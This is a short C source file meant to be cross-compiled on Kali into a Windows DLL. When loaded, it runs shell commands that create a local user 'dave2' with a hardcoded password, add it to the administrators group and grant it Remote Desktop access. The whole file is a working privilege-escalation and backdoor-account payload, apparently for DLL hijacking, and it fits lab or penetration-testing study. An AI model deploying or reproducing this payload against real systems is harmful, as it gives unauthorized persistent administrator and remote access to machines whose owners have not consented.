#include <stdlib.h>

//Compile instructions
//On Kali execute:
//x86_64-w64-mingw32-gcc adduser.c --shared -o .dll

int main ()
{
  int i;
  
  i = system ("net user dave2 Password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  i = system ("net localgroup 'Remote Desktop Users' dave2 /add");
  
  return 0;
}
